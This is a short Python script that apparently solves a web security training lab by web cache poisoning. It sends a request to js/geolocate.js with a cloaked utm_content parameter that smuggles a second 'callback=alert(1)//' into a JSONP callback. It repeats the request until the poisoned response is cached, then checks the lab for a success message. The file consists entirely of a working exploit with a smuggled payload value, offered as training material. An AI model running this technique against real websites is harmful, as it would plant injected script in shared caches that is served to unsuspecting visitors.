import requests
import time
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    def poison_home_page(self):
        response = self.session.get(self.lab_url + 'js/geolocate.js?callback=setCountryCookie&utm_content=hello;callback=alert(1)//', proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
        while True:
            if 'alert(1)' not in response.text:
                response = self.session.get(self.lab_url + 'js/geolocate.js?callback=setCountryCookie&utm_content=hello;callback=alert(1)//', proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
            else:
                break

    def check_solution(self):
        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.poison_home_page()
        time.sleep(30)
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()